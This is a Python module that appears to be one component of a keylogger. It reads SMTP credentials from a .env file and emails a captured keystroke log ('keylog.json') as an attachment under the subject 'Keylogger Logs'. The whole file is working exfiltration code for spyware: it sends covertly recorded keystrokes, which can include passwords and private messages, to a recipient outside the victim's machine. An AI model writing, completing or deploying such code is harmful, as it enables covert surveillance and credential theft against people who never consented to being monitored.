import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv

class EmailReporter:
    def __init__(self, config_file='.env'):
        """
        Initialize email configuration from .env file
        """
        load_dotenv(config_file)
        
        self.smtp_server = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
        self.smtp_port = int(os.getenv('SMTP_PORT', 587))
        self.sender_email = os.getenv('SENDER_EMAIL')
        self.sender_password = os.getenv('SENDER_PASSWORD')
        self.recipient_email = os.getenv('RECIPIENT_EMAIL')
    
    def send_log_email(self, log_file, subject='Keylogger Logs'):
        """
        Send log file via email with encryption
        """
        try:
            # Create multipart message
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.recipient_email
            msg['Subject'] = subject
            
            # Email body
            body = "Attached are the latest keylogger logs."
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach log file
            with open(log_file, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition', 
                f'attachment; filename= {os.path.basename(log_file)}'
            )
            msg.attach(part)
            
            # Send email
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.send_message(msg)
            
            print(f"Log file {log_file} sent successfully")
            return True
        
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
    
    def validate_email_config(self):
        """
        Validate email configuration
        """
        required_vars = [
            'SMTP_SERVER', 'SMTP_PORT', 
            'SENDER_EMAIL', 'SENDER_PASSWORD', 
            'RECIPIENT_EMAIL'
        ]
        
        missing_vars = [var for var in required_vars if not os.getenv(var)]
        
        if missing_vars:
            print(f"Missing environment variables: {missing_vars}")
            return False
        
        return True

def main():
    # Example usage
    reporter = EmailReporter()
    
    if reporter.validate_email_config():
        # Send a sample log file
        reporter.send_log_email('keylog.json')
    else:
        print("Email configuration is invalid. Please check your .env file.")

if __name__ == "__main__":
    main() 